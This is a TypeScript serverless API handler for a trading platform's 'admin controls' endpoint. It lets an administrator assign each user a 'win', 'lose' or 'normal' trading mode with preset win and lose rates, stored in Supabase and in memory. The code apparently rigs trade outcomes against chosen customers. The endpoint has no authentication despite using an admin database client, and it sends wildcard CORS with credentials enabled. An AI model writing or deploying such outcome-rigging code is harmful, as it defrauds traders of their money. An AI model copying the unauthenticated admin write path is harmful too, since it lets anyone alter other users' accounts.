import type { VercelRequest, VercelResponse } from '@vercel/node';
import { supabaseAdmin } from '../lib/supabase';

// Import trading controls from trading-controls module
let userTradingModes: Map<string, string>;

try {
  const tradingControlsModule = require('./trading-controls');
  userTradingModes = tradingControlsModule.userTradingModes;
} catch {
  // Fallback if module not available
  userTradingModes = new Map([
    ['demo-user-1', 'normal'],
    ['demo-user-2', 'win'],
    ['demo-user-3', 'lose'],
    ['demo-user-4', 'normal']
  ]);
}

// Mock admin controls data for demo
function getMockControls() {
  const now = new Date();
  const controls = [];

  // Generate controls for each user
  userTradingModes.forEach((mode, userId) => {
    controls.push({
      id: `control-${userId}`,
      userId,
      adminId: 'superadmin-001',
      controlType: mode,
      winRate: mode === 'win' ? 90 : mode === 'lose' ? 10 : 50,
      normalRate: mode === 'normal' ? 40 : 5,
      loseRate: mode === 'lose' ? 80 : mode === 'win' ? 5 : 10,
      isActive: true,
      notes: `Trading mode set to ${mode}`,
      createdAt: new Date(now.getTime() - Math.random() * 86400000).toISOString(),
      updatedAt: now.toISOString()
    });
  });

  return controls;
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    console.log(`🎮 Admin Controls API: ${req.method} ${req.url}`);
    
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');

    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    if (req.method === 'GET') {
      try {
        // Try to get from database first
        if (supabaseAdmin) {
          const { data: controls, error } = await supabaseAdmin
            .from('admin_controls')
            .select('*')
            .order('created_at', { ascending: false });

          if (!error && controls && controls.length > 0) {
            console.log('🎮 Controls from database - Count:', controls.length);
            return res.json(controls);
          }
        }
      } catch (dbError) {
        console.log('⚠️ Database query failed, using mock data');
      }

      // Fallback to mock data
      const mockControls = getMockControls();
      console.log('🎮 Using mock controls - Count:', mockControls.length);
      return res.json(mockControls);
    }

    if (req.method === 'POST') {
      // Create or update control
      const { userId, controlType, winRate, normalRate, loseRate, isActive, notes } = req.body || {};

      if (!userId || !controlType) {
        return res.status(400).json({
          success: false,
          message: "Missing required fields: userId, controlType"
        });
      }

      // Update in-memory trading mode
      userTradingModes.set(userId, controlType);

      const newControl = {
        id: `control-${userId}-${Date.now()}`,
        userId,
        adminId: 'superadmin-001',
        controlType,
        winRate: winRate || (controlType === 'win' ? 90 : controlType === 'lose' ? 10 : 50),
        normalRate: normalRate || (controlType === 'normal' ? 40 : 5),
        loseRate: loseRate || (controlType === 'lose' ? 80 : controlType === 'win' ? 5 : 10),
        isActive: isActive !== undefined ? isActive : true,
        notes: notes || `Trading mode set to ${controlType}`,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      };

      // Try to save to database
      try {
        if (supabaseAdmin) {
          await supabaseAdmin
            .from('admin_controls')
            .upsert(newControl);

          // Also update user's trading mode
          await supabaseAdmin
            .from('users')
            .update({
              trading_mode: controlType,
              updated_at: new Date().toISOString()
            })
            .eq('id', userId);

          console.log('✅ Control saved to database');
        }
      } catch (dbError) {
        console.log('⚠️ Database save failed, continuing with in-memory state');
      }

      console.log('✅ Admin control created/updated:', {
        userId,
        controlType,
        isActive: newControl.isActive
      });

      return res.json({
        success: true,
        control: newControl,
        message: "Control updated successfully"
      });
    }

    return res.status(405).json({
      success: false,
      message: "Method not allowed"
    });

  } catch (error) {
    console.error('❌ Admin controls error:', error);
    return res.status(500).json({
      success: false,
      message: "Failed to process controls request",
      error: error instanceof Error ? error.message : 'Unknown error'
    });
  }
}
